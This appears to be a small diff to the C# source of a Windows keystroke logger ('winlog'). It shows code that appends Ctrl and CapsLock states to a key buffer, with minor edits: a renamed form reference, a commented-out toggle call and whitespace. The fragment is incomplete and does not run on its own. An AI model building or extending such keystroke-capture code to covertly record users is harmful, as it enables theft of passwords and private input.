@@ -37,7 +37,7 @@ namespace winlog
 
         private void Print(string text)
         {
-            Form1._Form1.Print(text);
+            Form1._Instance.Print(text);
         }
 
         private void SetTimers()
@@ -108,7 +108,8 @@ namespace winlog
                         {
                             tglControl = true;
                             keyBuffer += "<Ctrl=On>";
-                        }
+                            //Form1._Instance.Toggle();
+                        }                        
                     }
                     else
                     {
@@ -143,6 +144,7 @@ namespace winlog
                             tglCapslock = true;
                             keyBuffer += "<CapsLock=On>";
                         }
+                      
                     }
                     else
                     {
